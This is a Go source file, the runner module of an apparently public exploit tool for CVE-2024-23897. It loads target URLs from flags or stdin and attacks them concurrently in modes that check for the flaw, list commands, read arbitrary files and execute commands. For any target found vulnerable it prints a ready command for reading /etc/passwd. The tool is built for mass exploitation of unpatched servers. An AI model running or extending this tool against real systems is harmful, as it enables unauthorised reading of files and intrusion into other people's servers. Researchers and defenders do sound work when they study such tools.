package runner

import (
	"bufio"
	"fmt"
	"github.com/fatih/color"
	"github.com/projectdiscovery/gologger"
	proxyutils "github.com/projectdiscovery/utils/proxy"
	readerutil "github.com/projectdiscovery/utils/reader"
	stringsutil "github.com/projectdiscovery/utils/strings"
	"github.com/remeh/sizedwaitgroup"
	"github.com/wjlin0/CVE-2024-23897/pkg/input"
	"github.com/wjlin0/CVE-2024-23897/pkg/output"
	"github.com/wjlin0/CVE-2024-23897/pkg/scanner"
	"github.com/wjlin0/CVE-2024-23897/pkg/types"
	updateutils "github.com/wjlin0/CVE-2024-23897/pkg/update"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

type Runner struct {
	scanner *scanner.Scanner
	options *types.Options
	targets []*input.Target
	wg      sizedwaitgroup.SizedWaitGroup
	success int
	sync.Mutex
}

func NewRunner(options *types.Options) (*Runner, error) {

	r := &Runner{options: options}
	r.parseTargets()

	scan, err := scanner.NewScanner(options)
	if err != nil {
		return nil, err
	}
	r.wg = sizedwaitgroup.New(r.options.Thread)
	r.scanner = scan
	return r, nil
}

func (r *Runner) parseTargets() {
	targets := make(map[string]struct{})
	options := r.options
	var target string
	var adjustTarget = func(target string) string {
		target = strings.TrimSpace(target)
		if target == "" {
			return ""
		}
		target = strings.TrimSuffix(target, "/")
		if !stringsutil.HasPrefixAny(target, "http://", "https://") {
			target = "http://" + target
		}
		return target
	}
	for _, target = range options.URL {
		if target = adjustTarget(target); target == "" {
			continue
		}
		targets[adjustTarget(target)] = struct{}{}
	}
	for _, target = range options.ListURL {
		if target = adjustTarget(target); target == "" {
			continue
		}
		targets[adjustTarget(target)] = struct{}{}
	}
	// 从标准输入中读取
	if options.Stdin {
		reader := readerutil.TimeoutReader{Reader: os.Stdin, Timeout: options.InputReadTimeout}
		scan := bufio.NewScanner(reader)
		for scan.Scan() {
			if target = adjustTarget(scan.Text()); target == "" {
				continue
			}
			targets[target] = struct{}{}
		}
	}
	for target = range targets {
		r.targets = append(r.targets, input.NewTarget(target))
	}
}

func (r *Runner) RunEnumeration() error {
	start := time.Now()
	r.displayExecutionInfo()

	switch {
	case r.options.IsListAvailableCommands():
		for _, target := range r.targets {
			r.wg.Add()
			go func(target *input.Target) {
				defer r.wg.Done()
				commands, result := r.scanner.ListAvailableCommands(target)
				if result == nil || len(commands) == 0 {
					return
				}
				r.AddSuccess()
				result.Response = fmt.Sprintf("%s\n", strings.Join(commands, ","))
				r.Output(result)
			}(target)
		}
	case r.options.IsReadMode():
		for _, target := range r.targets {
			r.wg.Add()
			go func(target *input.Target) {
				defer r.wg.Done()
				for _, filename := range r.options.Args {
					for _, command := range r.options.Command {
						result := r.scanner.ReadFile(target, command, filename)
						if result == nil || result.Response == "" {
							continue
						}
						result.Response = color.HiYellowString(result.Response)

						r.AddSuccess()

						r.Output(result)
					}
				}
			}(target)
		}
	case r.options.Exec:
		for _, target := range r.targets {
			r.wg.Add()
			go func(target *input.Target) {
				defer r.wg.Done()
				for _, command := range r.options.Command {
					result := r.scanner.Exec(target, command, strings.Join(r.options.Args, " "))
					if result == nil || result.Response == "" {
						continue
					}
					r.AddSuccess()

					r.Output(result)

				}
			}(target)
		}
	default:
		for _, target := range r.targets {
			r.wg.Add()
			go func(target *input.Target) {
				defer r.wg.Done()
				vul, full, result := r.scanner.Check(target)
				if !vul {
					return
				}
				r.AddSuccess()
				r.loadExecByUser(target, full, result)
				r.Output(result)

			}(target)

		}
	}

	r.wg.Wait()
	elapsed := time.Since(start)

	elapsedSec := float64(elapsed) / float64(time.Second)
	gologger.Info().Msgf("took %.2f seconds with %d successful targets", elapsedSec, r.success)
	return nil
}

func (r *Runner) displayExecutionInfo() {
	opts := r.options
	if !opts.DisableUpdateCheck {
		latestVersion, err := updateutils.GetToolVersionCallback(repoName, repoName)()
		if err != nil {
			if opts.Debug {
				gologger.Error().Msgf("%s version check failed: %v", repoName, err.Error())
			}
		} else {
			gologger.Info().Msgf("Current %s version v%v %v", repoName, version, updateutils.GetVersionDescription(version, latestVersion))
		}
	} else {
		gologger.Info().Msgf("Current %s version v%v ", repoName, version)
	}

	// 展示代理
	parse, _ := url.Parse(types.ProxyURL)
	if parse.Scheme == proxyutils.HTTPS || parse.Scheme == proxyutils.HTTP {
		gologger.Info().Msgf("Using %s as proxy server", parse.String())
	}

	if parse.Scheme == proxyutils.SOCKS5 {
		gologger.Info().Msgf("Using %s as socket proxy server", parse.String())
	}
	// 展示运行模式
	if r.options.IsCheckMode() {
		gologger.Info().Msgf("Running %s", output.ModeCheck)
	}
	if r.options.IsReadMode() {
		gologger.Info().Msgf("Running %s", output.ModeReadFile)
	}
	if r.options.IsExecMode() {
		gologger.Info().Msgf("Running %s", output.ModeExec)
	}
	if r.options.IsListAvailableCommands() {
		gologger.Info().Msgf("Running %s", output.ModeListAvailableCommands)
	}
	// 展示 targets数量
	gologger.Info().Msgf("Loaded %d targets from input", len(r.targets))

}

func (r *Runner) loadExecByUser(target *input.Target, full bool, result *output.ResultEvent) {
	buffer := strings.Builder{}
	if full {
		buffer.WriteString(color.HiGreenString("The target is Vulnerable && This can read full file contents\n") + "please use command to read full body. \n")
	} else {
		buffer.WriteString(color.HiGreenString("The target is Vulnerable.\n") + "please use command to read file first content. \n")
	}
	buffer.WriteString(color.HiYellowString(fmt.Sprintf("$ CVE-2024-23897 -u %s -c %s -a /etc/passwd", target.ToString(), result.Response)))
	if r.options.ProxyURL != nil {
		for _, p := range r.options.ProxyURL {
			buffer.WriteString(color.HiYellowString(fmt.Sprintf(" -p '%s'", p)))
		}
	}
	if r.options.Timeout != 10 {
		buffer.WriteString(color.HiYellowString(fmt.Sprintf(" -timeout %d", r.options.Timeout)))
	}
	if r.options.Thread != 30 {
		buffer.WriteString(color.HiYellowString(fmt.Sprintf(" -t %d", r.options.Thread)))
	}
	if r.options.RateLimit != -1 {
		buffer.WriteString(color.HiYellowString(fmt.Sprintf(" -rate-limit %d", r.options.RateLimit)))
	}
	if r.options.Headers != nil {
		for _, h := range r.options.Headers {
			buffer.WriteString(color.HiYellowString(fmt.Sprintf(" -header '%s'", h)))
		}
	}
	result.Response = buffer.String()
}
